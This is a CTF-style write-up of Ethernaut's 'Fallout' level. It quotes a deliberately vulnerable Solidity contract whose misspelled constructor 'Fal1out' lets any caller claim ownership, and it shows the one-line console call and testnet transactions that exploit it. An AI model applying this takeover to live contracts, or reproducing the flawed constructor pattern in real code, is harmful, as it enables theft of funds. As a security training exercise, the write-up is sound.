# Level 2: Fallout

## Game Description

This is the level 2 of [**Ethernaut**](https://ethernaut.openzeppelin.com/) game. It involves Solidity contract fallback function and the conversion between units wei & ether. We can see the following game description:

> Claim ownership of the contract below to complete this level.
>
> Things that might help
>
> - Solidity Remix IDE
>
> ```solidity
> // SPDX-License-Identifier: MIT
> pragma solidity ^0.6.0;
> 
> import 'openzeppelin-contracts-06/math/SafeMath.sol';
> 
> contract Fallout {
>   
>   using SafeMath for uint256;
>   mapping (address => uint) allocations;
>   address payable public owner;
> 
> 
>   // constructor
>   function Fal1out() public payable {
>     owner = msg.sender;
>     allocations[owner] = msg.value;
>   }
> 
>   modifier onlyOwner {
> 	        require(
> 	            msg.sender == owner,
> 	            "caller is not the owner"
> 	        );
> 	        _;
> 	    }
> 
>   function allocate() public payable {
>     allocations[msg.sender] = allocations[msg.sender].add(msg.value);
>   }
> 
>   function sendAllocation(address payable allocator) public {
>     require(allocations[allocator] > 0);
>     allocator.transfer(allocations[allocator]);
>   }
> 
>   function collectAllocations() public onlyOwner {
>     msg.sender.transfer(address(this).balance);
>   }
> 
>   function allocatorBalance(address allocator) public view returns (uint) {
>     return allocations[allocator];
>   }
> }
> ```

## Solution

This level can only be completed if we are `owner` of this contract.

First of all - intended constructor declaration has typo, `Fal1out` instead of `Fallout`. So it's just treated as a normal method not a constructor. Secondly, even if it wasn't a typo, that is - constructor was declared as `Fallout`, it won't even compile! Because target contract uses `v0.6.0`. Older versions of Solidity had this kind of constructor declaration. It was mandated even in `v0.5.0`  - *"Constructors must now be defined using the constructor keyword"*.

```solidity
> await contract.Fal1out()
⛏️ Sent transaction ⛏ https://goerli.etherscan.io/tx/0x80402be691d2ea6c0affac3d5d3258aa02ed0a7cf846a43be579b6e3c5e83701
⛏️ Mined transaction ⛏ https://goerli.etherscan.io/tx/0x80402be691d2ea6c0affac3d5d3258aa02ed0a7cf846a43be579b6e3c5e83701
{tx: '0x80402be691d2ea6c0affac3d5d3258aa02ed0a7cf846a43be579b6e3c5e83701', receipt: {…}, logs: Array(0)}
> await contract.owner() == player
true
```

Submitting level instance.

```solidity
╚(▲_▲)╝ Submitting level instance... <  < <<PLEASE WAIT>> >  >
⛏️ Sent transaction ⛏ https://goerli.etherscan.io/tx/0x1726d8a80fcadcf1c43512f550da77f911d0657ff231535c399397fe7a6eb145
⛏️ Mined transaction ⛏ https://goerli.etherscan.io/tx/0x1726d8a80fcadcf1c43512f550da77f911d0657ff231535c399397fe7a6eb145
O=('-'Q) Well done, You have completed this level!!!
O=('-'Q) Well done, You have completed this level!!!
O=('-'Q) Well done, You have completed this level!!!
```

Level completed! [**Go to the next level**](Coin Flip.md).

